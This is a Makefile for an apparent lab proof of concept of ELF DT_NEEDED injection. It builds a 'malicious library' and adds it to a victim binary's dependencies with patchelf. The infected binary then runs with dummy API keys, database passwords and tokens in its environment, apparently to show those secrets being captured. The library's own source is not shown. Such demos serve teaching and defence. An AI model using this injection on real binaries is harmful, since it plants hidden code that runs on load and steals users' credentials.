# DT_NEEDED Injection POC - Makefile
#
# Usage:
#   make              - Build all components
#   make demo         - Run all demonstrations
#   make explore      - Explore DT_NEEDED entries
#   make inject       - Demonstrate DT_NEEDED injection
#   make clean        - Remove built files

CC = gcc
CFLAGS = -Wall -Wextra -g

# Targets
EXPLORER = dt_needed_explorer
INJECTOR = dt_needed_injector
VICTIM = victim
VICTIM_INFECTED = victim_infected
EVIL_LIB = libevil_needed.so

.PHONY: all clean demo explore inject show-deps compare check-patchelf

all: $(EXPLORER) $(INJECTOR) $(VICTIM) $(EVIL_LIB)

# ═══════════════════════════════════════════════════════════════════════════
# BUILD TARGETS
# ═══════════════════════════════════════════════════════════════════════════

$(EXPLORER): dt_needed_explorer.c
	$(CC) $(CFLAGS) -o $@ $< -ldl
	@echo "[+] Built: $@ (DT_NEEDED explorer)"

$(INJECTOR): dt_needed_injector.c
	$(CC) $(CFLAGS) -o $@ $<
	@echo "[+] Built: $@ (DT_NEEDED injector)"

$(VICTIM): victim.c
	$(CC) $(CFLAGS) -o $@ $<
	@echo "[+] Built: $@"

$(EVIL_LIB): evil_needed.c
	$(CC) -shared -fPIC -o $@ $< -ldl
	@echo "[+] Built: $@ (malicious library)"

# ═══════════════════════════════════════════════════════════════════════════
# DEMONSTRATION TARGETS
# ═══════════════════════════════════════════════════════════════════════════

demo: all check-patchelf explore show-deps inject-demo
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  ALL DEMONSTRATIONS COMPLETE"
	@echo "════════════════════════════════════════════════════════════════"
	@echo ""
	@echo "Injection log:"
	@cat /tmp/dt_needed_injection.log 2>/dev/null || echo "(no log)"

check-patchelf:
	@which patchelf > /dev/null 2>&1 || (echo "[!] patchelf not found. Install with: sudo apt install patchelf" && exit 1)

# Explore DT_NEEDED entries
explore: $(EXPLORER)
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  EXPLORING DT_NEEDED ENTRIES"
	@echo "════════════════════════════════════════════════════════════════"
	./$(EXPLORER)

# Show dependencies of victim
show-deps: $(VICTIM)
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  VICTIM'S DT_NEEDED ENTRIES (before injection)"
	@echo "════════════════════════════════════════════════════════════════"
	@echo ""
	@echo ">>> Using readelf:"
	@readelf -d $(VICTIM) 2>/dev/null | grep -E "(NEEDED|RPATH|RUNPATH)" || echo "(none)"
	@echo ""
	@echo ">>> Using ldd:"
	@ldd $(VICTIM) 2>/dev/null || echo "(ldd not available)"
	@echo ""

# Main injection demonstration using patchelf
inject-demo: $(VICTIM) $(EVIL_LIB)
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  STEP 1: CLEAN VICTIM (before injection)"
	@echo "════════════════════════════════════════════════════════════════"
	@echo ""
	@rm -f $(VICTIM_INFECTED)
	@cp $(VICTIM) $(VICTIM_INFECTED)
	@echo ">>> DT_NEEDED entries in clean binary:"
	@readelf -d $(VICTIM_INFECTED) 2>/dev/null | grep NEEDED | head -5
	@echo ""
	SECRET_API_KEY="sk-secret-12345" DATABASE_PASSWORD="super_secret_db_pass" ./$(VICTIM_INFECTED) -q
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  STEP 2: INJECTING DT_NEEDED ENTRY"
	@echo "════════════════════════════════════════════════════════════════"
	@echo ""
	@echo ">>> Running: patchelf --add-needed $(EVIL_LIB) $(VICTIM_INFECTED)"
	@patchelf --add-needed $(EVIL_LIB) $(VICTIM_INFECTED)
	@echo ""
	@echo ">>> DT_NEEDED entries AFTER injection:"
	@readelf -d $(VICTIM_INFECTED) 2>/dev/null | grep NEEDED
	@echo ""
	@echo "  Notice: "
	@echo "    - $(EVIL_LIB) is now in the dependency list"
	@echo "    - It will be loaded BEFORE the program starts"
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  STEP 3: RUNNING INFECTED VICTIM"
	@echo "════════════════════════════════════════════════════════════════"
	@echo ""
	@echo ">>> Setting LD_LIBRARY_PATH to find our evil library..."
	@echo ""
	LD_LIBRARY_PATH=. SECRET_API_KEY="sk-secret-12345" DATABASE_PASSWORD="super_secret_db_pass" AUTH_TOKEN="ghp_xxxxxxxxxxxx" ./$(VICTIM_INFECTED)

# Simple injection test
inject: $(INJECTOR) $(VICTIM)
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  MANUAL INJECTION TOOL DEMO"
	@echo "════════════════════════════════════════════════════════════════"
	./$(INJECTOR)

# Show the attack visually
show-attack: $(VICTIM) $(VICTIM_INFECTED)
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  SIDE-BY-SIDE COMPARISON"
	@echo "════════════════════════════════════════════════════════════════"
	@echo ""
	@echo ">>> CLEAN BINARY:"
	@readelf -d $(VICTIM) 2>/dev/null | grep NEEDED
	@echo ""
	@echo ">>> INFECTED BINARY:"
	@readelf -d $(VICTIM_INFECTED) 2>/dev/null | grep NEEDED || echo "(run 'make inject-demo' first)"
	@echo ""

# Compare file sizes
compare: $(VICTIM)
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  FILE SIZE COMPARISON"
	@echo "════════════════════════════════════════════════════════════════"
	@echo ""
	@ls -la $(VICTIM) $(VICTIM_INFECTED) 2>/dev/null || echo "(run 'make inject-demo' first)"
	@echo ""
	@echo "Note: patchelf may increase file size to add new sections"
	@echo ""

clean:
	rm -f $(EXPLORER) $(INJECTOR) $(VICTIM) $(VICTIM_INFECTED) $(EVIL_LIB)
	rm -f /tmp/dt_needed_injection.log
	@echo "[+] Cleaned"
